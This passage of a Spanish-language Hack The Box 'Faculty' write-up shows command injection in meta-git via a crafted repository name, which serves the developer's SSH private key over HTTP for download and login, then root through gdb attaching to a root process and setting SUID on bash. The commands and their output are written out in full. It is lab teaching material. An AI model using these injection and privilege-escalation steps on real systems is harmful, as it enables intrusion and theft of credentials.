<span class="go">/usr/local/lib/node_modules/meta-git                                                  
/usr/local/lib/node_modules/meta-git/bin/meta-git                                     
/usr/local/bin/meta-git                  
</span><span class="gp">gbyolo@faculty:/$</span><span class="w"> </span><span class="nb">cd</span> /usr/local/lib/node_modules/meta-git
<span class="gp">gbyolo@faculty:/usr/local/lib/node_modules/meta-git$</span><span class="w"> </span><span class="nb">ls</span>                               
<span class="go">README.md  __tests__  bin  commitlint.config.js  index.js  jest.json  lib  node_modules  package.json
</span><span class="gp">gbyolo@faculty:/usr/local/lib/node_modules/meta-git$</span><span class="w"> </span><span class="nb">cat </span>package.json     
<span class="go">{                                                                                     
  "_from": "meta-git@1.1.2",
  "_id": "meta-git@1.1.2",
  "_inBundle": false,                                                                 
  "_integrity": "sha512-HMoLDeIgVBAl8/neDKX3RfRV4CAiRrrMxqCGmo1eyRS33cxYqIWVr9RS87m5mYnVgLHN8JmsahkpOdbKr3M4Ew==",
  "_location": "/meta-git",                                                           
  "_phantomChildren": {},
  "_requested": {              
    "type": "version",                                                                
    "registry": true,                                                                 
    "raw": "meta-git@1.1.2",                                                          
    "name": "meta-git",                                                               
    "escapedName": "meta-git",                                                        
    "rawSpec": "1.1.2",                                                               
    "saveSpec": null,                    
    "fetchSpec": "1.1.2"                                                              

  //...

  },
  "version": "1.1.2" &lt;------- Here!
}
</span></pre></table></code></div></div><p>Con la versi√≥n correcta encontramos una vulnerabilidad:</p><p><img data-src="/assets/img/htb/writeups/faculty/meta_git_vuln.png" alt="METAGit" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Reporte de la vulnerabilidad <a href="https://hackerone.com/reports/728040">https://hackerone.com/reports/728040</a></p></div></blockquote><p>En resumen, lo que ocurre es que al ejecutar el comando <code class="language-plaintext highlighter-rouge">meta-git clone &lt;repository_name&gt;</code> el input del usuario <strong>&lt;repository_name&gt;</strong> se asigna dentro de una cadena sin sanitizar que luego se ejecuta como un comando:</p><blockquote><p>Parte del c√≥digo del problema</p></blockquote><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="c1">//...</span>

<span class="nx">exec</span><span class="p">(</span>
    <span class="p">{</span>
      <span class="na">cmd</span><span class="p">:</span> <span class="s2">`git clone </span><span class="p">${</span><span class="nx">meta</span><span class="p">.</span><span class="nx">projects</span><span class="p">[</span><span class="nx">name</span><span class="p">]}</span><span class="s2"> </span><span class="p">${</span><span class="nx">name</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span> <span class="o">&lt;---------</span> <span class="nx">Problem</span><span class="o">!</span>
      <span class="na">displayDir</span><span class="p">:</span> <span class="nx">path</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">name</span><span class="p">),</span>
    <span class="p">},</span>
    <span class="nx">next</span>
<span class="p">);</span>
<span class="c1">//...</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Aqu√≠ encuentras el c√≥digo completo <a href="https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49">https://github.com/mateodelnorte/meta-git/blob/master/lib/metaGitUpdate.js#L49</a></p></div></blockquote><p>Ahora solo queda explotar la vulnerabilidad. Primero tengamos en cuenta que tenemos que ejecutar <code class="language-plaintext highlighter-rouge">meta-git</code> como el usuario <code class="language-plaintext highlighter-rouge">developer</code>, para ello usamos el comando <code class="language-plaintext highlighter-rouge">sudo -u &lt;user&gt;</code> junto a <code class="language-plaintext highlighter-rouge">/usr/local/bin/meta-git clone '&lt;user_input&gt;'</code>, donde nuestro <strong>&lt;user_input&gt;</strong> ser√° cualquier nombre ya que no tenemos un repositorio actual y haremos uso de el operador l√≥gico <code class="language-plaintext highlighter-rouge">||</code> el c√∫al funciona como un <strong>or</strong> y al momento que falle la llamada al repositorio inexistente pasar√° a ejecutar el comando que insertemos luego:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="gp">gbyolo@faculty:/$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> developer /usr/local/bin/meta-git clone <span class="s1">'any text || whoami'</span>
<span class="go">meta git cloning into 'any text || whoami' at any text || whoami

any text || whoami:
fatal: repository 'any' does not exist
whoami: extra operand ‚Äòany‚Äô
Try 'whoami --help' for more information.
developer  &lt;---------------------------------------- Remote Code Execution
any text || whoami ‚úì
(node:38044) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/any text || whoami'
    at process.chdir (internal/process/main_thread_only.js:31:12)
    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
    at process._tickCallback (internal/process/next_tick.js:68:7)
    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
(node:38044) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 1)
(node:38044) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
</span></pre></table></code></div></div><p>Solo queda obtener la llave privada <code class="language-plaintext highlighter-rouge">id_rsa</code> del usuario <code class="language-plaintext highlighter-rouge">developer</code> para entrar por <strong>SSH</strong> y conseguir la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="gp">gbyolo@faculty:/$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> developer /usr/local/bin/meta-git clone <span class="s1">'any text || /usr/bin/python3 -m http.server -d /home/developer/.ssh 1234 &amp;&amp; foo'</span>
<span class="go">meta git cloning into 'any text || /usr/bin/python3 -m http.server -d /home/developer/.ssh 1234 &amp;&amp; foo' at .ssh 1234 &amp;&amp; foo

.ssh 1234 &amp;&amp; foo:
fatal: repository 'any' does not exist
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.14.76 - - [06/Aug/2022 01:28:22] "GET /id_rsa HTTP/1.1" 200 -
                    
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚ùØ wget -q http://10.10.11.169:1234/id_rsa
‚ùØ chmod 600 id_rsa
‚ùØ ssh -i id_rsa developer@10.10.11.169
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

</span><span class="c">...
</span><span class="go">
Last login: Sat Aug  6 01:28:59 2022 from 10.10.14.76
</span><span class="gp">developer@faculty:~$</span><span class="w"> </span>find / <span class="nt">-name</span> user.txt 2&gt;/dev/null | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">-rw-r----- 1 root developer 33 Aug  5 06:54 /home/developer/user.txt
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Tienes agregar al final del comando una coma <code class="language-plaintext highlighter-rouge">;</code> √≥ (<code class="language-plaintext highlighter-rouge">||</code> y <code class="language-plaintext highlighter-rouge">&amp;&amp;</code> seguidos por cualquier expresi√≥n), todo con el fin que valide el comando completo y no ocurran errores</p></div></blockquote><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Como el usuario <code class="language-plaintext highlighter-rouge">developer</code> somos parte del grupo <code class="language-plaintext highlighter-rouge">debug</code>, entonces buscamos archivos que formen parte de este grupo y encontramos la aplicaci√≥n/binario <code class="language-plaintext highlighter-rouge">gdb</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">developer@faculty:~$</span><span class="w"> </span>find / <span class="nt">-group</span> debug 2&gt;/dev/null | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">-rwxr-x--- 1 root debug 8440200 Dec  8  2021 /usr/bin/gdb
</span></pre></table></code></div></div><p>Vemos que podemos usar el depurador <code class="language-plaintext highlighter-rouge">gdb</code>:</p><p><img data-src="/assets/img/htb/writeups/faculty/gdb_def.png" alt="GDB" class="shadow" data-proofer-ignore></p><p>Tambi√©n con <code class="language-plaintext highlighter-rouge">gdb</code> podemos enlazarnos a un cierto proceso con <code class="language-plaintext highlighter-rouge">gdb -p &lt;process_pid&gt;</code>, examinar su c√≥digo y tambi√©n usar las librer√≠as de los programas que son parte del proceso. Adem√°s si ese proceso es ejecutado como un <strong>usuario privilegiado</strong>, est√° claro que tendremos sus privilegios</p><blockquote><p>Primero debemos encontrar procesos que ejecute el usuario <code class="language-plaintext highlighter-rouge">root</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="gp">developer@faculty:~$</span><span class="w"> </span>ps aux | <span class="nb">grep </span>root
<span class="go">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span><span class="c">...
</span><span class="go">root         615  0.0  0.0      0     0 ?        I&lt;   Aug05   0:00 [kaluad]
root         616  0.0  0.0      0     0 ?        I&lt;   Aug05   0:00 [kmpath_rdacd]
root         617  0.0  0.0      0     0 ?        I&lt;   Aug05   0:00 [kmpathd]
root         618  0.0  0.0      0     0 ?        I&lt;   Aug05   0:00 [kmpath_handlerd]
root         619  0.0  0.8 214604 17952 ?        SLsl Aug05   0:07 /sbin/multipathd -d -s
root         664  0.0  0.5  46324 10760 ?        Ss   Aug05   0:00 /usr/bin/VGAuthService
root         670  0.1  0.4 310256  8136 ?        Ssl  Aug05   1:19 /usr/bin/vmtoolsd
root         671  0.0  0.2  99896  5892 ?        Ssl  Aug05   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
root         695  0.0  0.4 238080  9176 ?        Ssl  Aug05   0:01 /usr/lib/accountsservice/accounts-daemon
root         723  0.0  0.1  81956  3672 ?        Ssl  Aug05   0:03 /usr/sbin/irqbalance --foreground
root         724  0.0  0.8  26896 17880 ?        Ss   Aug05   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers &lt;-------- Interesting
root         729  0.0  0.4 236436  8988 ?        Ssl  Aug05   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         740  0.0  0.3  17472  7152 ?        Ss   Aug05   0:01 /lib/systemd/systemd-logind
root         741  0.0  0.6 395512 13696 ?        Ssl  Aug05   0:00 /usr/lib/udisks2/udisksd
root         785  0.0  0.6 318816 13520 ?        Ssl  Aug05   0:00 /usr/sbin/ModemManager
root         912  0.0  0.1   5568  2964 ?        Ss   Aug05   0:00 /usr/sbin/cron -f
root         913  0.0  0.8 194680 16848 ?        Ss   Aug05   0:04 php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)
root         920  0.0  0.1   7248  3172 ?        S    Aug05   0:00 /usr/sbin/CRON -f
</span><span class="gp">root         925  0.0  0.0  55276  1540 ?        Ss   Aug05   0:00 nginx: master process /usr/sbin/nginx -g daemon on;</span><span class="w"> </span>master_process on<span class="p">;</span>
<span class="go">root         927  0.0  0.0   2608   528 ?        Ss   Aug05   0:00 /bin/sh -c bash /root/service_check.sh           
root         929  0.0  0.1   5648  2944 ?        S    Aug05   0:06 bash /root/service_check.sh

</span><span class="c">...
</span><span class="go">
</span></pre></table></code></div></div><blockquote><p>Luego nos enlazamos con <code class="language-plaintext highlighter-rouge">gdb</code> y el respectivo <strong>PID</strong> del proceso</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="gp">developer@faculty:~$</span><span class="w"> </span>gdb <span class="nt">-p</span> 724                                                
<span class="go">GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2                                             
Copyright (C) 2020 Free Software Foundation, Inc.                  
</span><span class="gp">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><span class="w">
</span><span class="go">This is free software: you are free to change and redistribute it.                    
There is NO WARRANTY, to the extent permitted by law.                                 
Type "show copying" and "show warranty" for details.                                                                                                                        
This GDB was configured as "x86_64-linux-gnu".                                        
Type "show configuration" for configuration details.                                                                                                                        
For bug reporting instructions, please see:                     
</span><span class="gp">&lt;http://www.gnu.org/software/gdb/bugs/&gt;</span><span class="nb">.</span>                                                                                                                                    
<span class="go">Find the GDB manual and other documentation resources online at:                                                                                                            
</span><span class="gp">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;</span><span class="nb">.</span>                                                                                                                       
<span class="go">                                                                                                                                                                            
For help, type "help".                                                                                                                                                      
Type "apropos word" to search for commands related to "word".         
Attaching to process 724                                                              
Reading symbols from /usr/bin/python3.8...                                                                                                                                  
(No debugging symbols found in /usr/bin/python3.8)                                                                                                                          
Reading symbols from /lib/x86_64-linux-gnu/libc.so.6...                       
</span><span class="gp">--Type &lt;RET&gt;</span><span class="w"> </span><span class="k">for </span>more, q to quit, c to <span class="k">continue </span>without paging--                                                                                                            
<span class="go">Reading symbols from /usr/lib/debug/.build-id/18/78e6b475720c7c51969e69ab2d276fae6d1dee.debug...

</span><span class="c">...
</span><span class="go">
Reading symbols from /lib/x86_64-linux-gnu/libbz2.so.1.0...
(No debugging symbols found in /lib/x86_64-linux-gnu/libbz2.so.1.0)
Reading symbols from /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so...
(No debugging symbols found in /usr/lib/python3.8/lib-dynload/_lzma.cpython-38-x86_64-linux-gnu.so)
0x00007f60d12c3967 in __GI___poll (fds=0xbd2a60, nfds=3, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:29
29      ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
(gdb)
</span></pre></table></code></div></div><p>Al ejecutar observamos que se leen diversas librerias de los programas que forman parte en el proceso. Entonces usando el comando <code class="language-plaintext highlighter-rouge">info function &lt;reg_expresion&gt;</code> podemos buscar las funciones disponibles del programa en cuesti√≥n:</p><blockquote><p>Buscamos funciones con la expresion <strong>system</strong> con el prop√≥sito de poder ejecutar comandos</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="go">(gdb) info function system
All functions matching regular expression "system":

File ../sysdeps/posix/system.c: &lt;------------------------- C file!
</span><span class="gp">197:    int __libc_system(const char *);</span><span class="w">
</span><span class="gp">102:    static int do_system(const char *);</span><span class="w">
</span><span class="go">
File pt-system.c:
</span><span class="gp">38:     static int system_compat(const char *);</span><span class="w">
</span><span class="go">
File svc.c:
</span><span class="gp">309:    void __GI_svcerr_systemerr(SVCXPRT *);</span><span class="w">
</span><span class="go">
Non-debugging symbols:
0x0000000000425530  system@plt
0x00007f60d0a42180  g_mem_is_system_malloc
0x00007f60d0a73d60  g_get_system_data_dirs

</span><span class="c">...
</span><span class="go">
</span></pre></table></code></div></div><p>Buscando el archivo con su ruta relativa, encontramos que es una librer√≠a est√°ndar de C que nos permite <strong>ejecutar subprocesos o comandos en el Sistema Operativo</strong>. Adem√°s pertenece a <strong>Glibc</strong> que es una <strong>librer√≠a central del sistema</strong> en C y es esencial en la mayor√≠a de programas</p><blockquote><p>Entonces llamamos a la funci√≥n <strong>system</strong> con el comando <code class="language-plaintext highlighter-rouge">call system("&lt;command&gt;")</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="go">(gdb) call system("chmod u+s /bin/bash")
[Detaching after vfork from child process 42640]
</span><span class="gp">$</span>4 <span class="o">=</span> 0      &lt;<span class="nt">---------</span> successful process
<span class="go">(gdb) call system("wrong command")
[Detaching after vfork from child process 42653]
</span><span class="gp">$</span>5 <span class="o">=</span> 32512  &lt;<span class="nt">---------</span> unsuccessful process
</pre></table></code></div></div><p>Solo asignamos a la <code class="language-plaintext highlighter-rouge">bash</code> permisos <strong>SUID</strong> para poder ejecutarlo como el propietario (root)</p><blockquote><p>Por √∫ltimo usamos el comando <code class="language-plaintext highlighter-rouge">shell</code> para obtener una consola, usamos <code class="language-plaintext highlighter-rouge">bash -p</code> para ejecutar la bash como el propietario y ser <strong>root</strong></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="go">(gdb) shell
</span><span class="gp">bash-5.0$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
<span class="go">-rwsr-xr-x 1 root root 1183448 Apr 18 11:14 /bin/bash
</span><span class="gp">bash-5.0$</span><span class="w"> </span>bash <span class="nt">-p</span>
<span class="gp">bash-5.0#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span><span class="gp">bash-5.0#</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">-rw-r----- 1 root root 33 Aug  5 06:54 /root/root.txt
</span></pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >Medium</a> <a href="/tags/python-scripting/" class="post-tag no-text-decoration" >Python Scripting</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >SQLI</a> <a href="/tags/xss/" class="post-tag no-text-decoration" >XSS</a> <a href="/tags/mpdf/" class="post-tag no-text-decoration" >mPDF</a> <a href="/tags/meta-git/" class="post-tag no-text-decoration" >meta-git</a> <a href="/tags/gdb/" class="post-tag no-text-decoration" >GDB</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Faculty - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBFaculty/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Faculty - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBFaculty/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBFaculty/&amp;text=Hackthebox Writeup Faculty - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBShared/"><div class="card-body"> <em class="timeago small" data-ts="1660598471" > 2022-08-15 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Shared</h3><div class="text-muted small"><p> Overview: Database enumeration and SSH password leak by SQL Inyection Remote command execution in IPython (CVE-2022-21699) (Foothold) Redis password leak exploiting a connection binary Re...</p></div></div></a></div><div class="card"> <a href="/posts/HTBZipping/"><div class="card-body"> <em class="timeago small" data-ts="1694710800" > 2023-09-14 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Zipping Report</h3><div class="text-muted small"><p> Information gathering Scope: 10.10.11.229/32 (Linux) TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenS...</p></div></div></a></div><div class="card"> <a href="/posts/HTBMeta/"><div class="card-body"> <em class="timeago small" data-ts="1644619727" > 2022-02-11 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Meta</h3><div class="text-muted small"><p> En la fase de enumeraci√≥n encontramos que en el servicio web se aplica Virtual Hosting y buscando subdominios encontramos una p√°gina para extraer Metadatos usando la herramienta exiftool. Encontram...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBNoter/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Noter</p></a> <a href="/posts/HTBShared/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Shared</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> ¬© 2023 <a href="https://twitter.com/username">Marsello Guill√©n</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script 